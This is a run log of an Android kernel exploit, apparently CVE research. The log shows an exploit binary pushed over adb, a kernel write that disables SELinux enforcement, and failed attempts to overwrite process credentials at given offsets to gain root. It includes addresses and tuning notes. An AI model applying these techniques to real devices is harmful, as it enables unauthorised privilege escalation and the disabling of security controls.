[06:43:51] === preflight ===
* daemon not running; starting now at tcp:5037
* daemon started successfully
5.10.236-android12-9-o-gaf2075ad2c06
Enforcing
5fe2227e-11e8-4fc1-b6f5-10fe63eb7038
 06:43:57 up 11 min,  0 users,  load average: 3.43, 5.21, 4.58
3.43 5.21 4.58 3/7478 30449
[06:43:57]   clearing leftover glx* from previous runs:
    remaining: 0
./exploit_guard: 1 file pushed, 0 skipped. 25.3 MB/s (73008 bytes in 0.003s)
./exploit_guard: 1 file pushed, 0 skipped. 24.6 MB/s (73008 bytes in 0.003s)
[06:44:00] === step 1: SELinux Permissive ===
[06:44:49]   W1 round 1: Enforcing
[06:45:41]   W1 round 2: Enforcing
[06:46:32]   W1 round 3: Permissive
[06:46:32]   W1 evidence:
    === v12 W1: selinux_enforcing = 0 (8-byte write, low byte 0) ===
    W1 base        = 0xffffff8868db8000
    W1 write_value = 0xffffff8868db8100
    W1 write_target= 0xffffff802aa793c8 (selinux_enforcing alias)
    probe_state    = D
    probe_done     = 1
    enforce read   = 0 value='0'
    ★ W1 SELinux disabled (enforcing byte == 0)
[06:46:34] === step 2: host-side kernel log (dmesg poll, deduped by timestamp) ===
[06:46:35]   /dev/kmsg NOT readable (expected here) — polling dmesg from the host
[06:46:41]   klog lines after 5s: 2000
[06:46:41] === step 3: load settle (max 15s, threshold 16) ===
[06:46:42]   load1=35.31
[06:46:47]   load1=32.72
[06:46:51]   load1=30.34
[06:46:55]   load1=28.15
[06:46:59]   load1=28.15
[06:47:03]   load1=26.14
[06:47:07]   load1=24.36
[06:47:10] === step 4: LT child (pure userspace spin, NO_EXEC) ===
[06:47:32]   task=0xffffff88d2861280 child_pid=30023 lt_parent=27110
[06:47:33]   baseline: Uid: 2000 2000 2000 2000
[06:47:34]   starting uid.trace on pid 30023
[06:47:34] === step 5: 0x778 shot(s) (real_cred) ===
[06:47:36]   [w778r1] ONE shot: off=0x778 chainwait=6000ms hold=600s nodrain=1 
[06:48:12]   [w778r1] shot wall-clock: 35s
    W7[W7] write_value = 0xffffff87b7368100
    W7[W7] write_target= 0xffffff802aa793c8
    probe_state    = D
    probe_done     = 1
    ✗ W7[W7] miss (probe_state=D)
    W7[W7] PIN child 6066 holds the payload page 600s; writer returns now
[06:48:17]   [w778r1] victim readback NOW: [Uid: 2000 2000 2000 2000]
[06:48:17]   [w778r1] if 0x778 LANDED the side effect puts write_target at cred+8, so
[06:48:18]   [w778r1] /proc/status must read:  Uid: 0 0 4294967168 0   and   Gid first field = 715625416
[06:48:19]   [w778r1] probe_state=D  (D=landed, R=miss, S=blocked)
[06:48:21]   [w778] probe_state=D on round 1 — the write landed
[06:48:22]   after 0x778: [Uid: 2000 2000 2000 2000]   (recorded as data; the gate is 0x780 + repair)
[06:48:23] === step 6: 0x780 shot(s) (cred) ===
[06:48:24]   [w780r1] ONE shot: off=0x780 chainwait=6000ms hold=600s nodrain=1 
[06:49:02]   [w780r1] shot wall-clock: 36s
    W7[W7] write_value = 0xffffff8869a80100
    W7[W7] write_target= 0xffffff802aa793c8
    probe_state    = R
    probe_done     = 0
    ✗ W7[W7] miss (probe_state=R)
    W7[W7] PIN child 14331 holds the payload page 600s; writer returns now
[06:49:07]   [w780r1] victim readback NOW: [Uid: 2000 2000 2000 2000]
[06:49:08]   [w780r1] probe_state=R  (D=landed, R=miss, S=blocked)
[06:49:32]   [w780] round 1/1: readback unchanged
[06:49:33]   ✗ 0x780 did not move the readback — SKIPPING the repair.
[06:49:33]     The repair only exists to clear cred+8 of the cred that was actually
[06:49:34]     installed; with nothing installed it repairs a page nobody points at.
[06:49:34]     (Run 7 burned 86 s on exactly that.)
[06:49:35] === step 8: poke LT parent (BEFORE the verdict, so its own report counts) ===
[06:49:40]   child report: iter=12 uid=2000 caps=0 capeff=0x0 pid=30023
[06:49:40] === verdict ===
[06:49:42]   /proc/30023/status Uid: [Uid: 2000 2000 2000 2000]
[06:49:43]   child's own report:     [iter=25 uid=2000 caps=0 capeff=0x0 pid=30023]
[06:49:43]   ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.
[06:49:44] === step 9: watch 120s ===
[06:49:57]   t+5s up=1048 services=5/5
[06:50:10]   t+10s up=1060 services=5/5
[06:50:23]   t+15s up=1074 services=5/5
[06:50:42]   t+20s up=1086 services=5/5
[06:50:56]   t+25s up=1107 services=5/5
[06:51:07]   t+30s up=1119 services=5/5
[06:51:21]   t+35s up=1130 services=5/5
[06:51:34]   t+40s up=1144 services=5/5
[06:51:45]   t+45s up=1157 services=5/5
[06:51:57]   t+50s up=1168 services=5/5
[06:52:09]   t+55s up=1180 services=5/5
[06:52:21]   t+60s up=1192 services=5/5
[06:52:33]   t+65s up=1204 services=5/5
[06:52:44]   t+70s up=1216 services=5/5
[06:52:56]   t+75s up=1227 services=5/5
[06:53:08]   t+80s up=1239 services=5/5
[06:53:21]   t+85s up=1251 services=5/5
[06:53:33]   t+90s up=1264 services=5/5
[06:53:43]   t+95s up=1275 services=5/5
[06:53:55]   t+100s up=1286 services=5/5
[06:54:07]   t+105s up=1299 services=5/5
[06:54:23]   t+110s up=1311 services=5/5
[06:54:35]   t+115s up=1326 services=5/5
[06:54:47]   t+120s up=1338 services=5/5
[06:54:48] === step 10: evidence ===
[06:54:50]   klog.host: 5037 lines, 5037 unique
[06:54:51]   --- reboot / watchdog markers (NOT ROOTCHECK) ---
[06:54:53]   --- guard markers ---
[06:54:54]     (none)
reboot
Permissive
 06:54:55 up 22 min,  0 users,  load average: 3.90, 26.97, 27.41
0
[06:54:57] evidence -> D:/Desktop/cve202643499/out/run12_064349
[06:54:58] === done ===
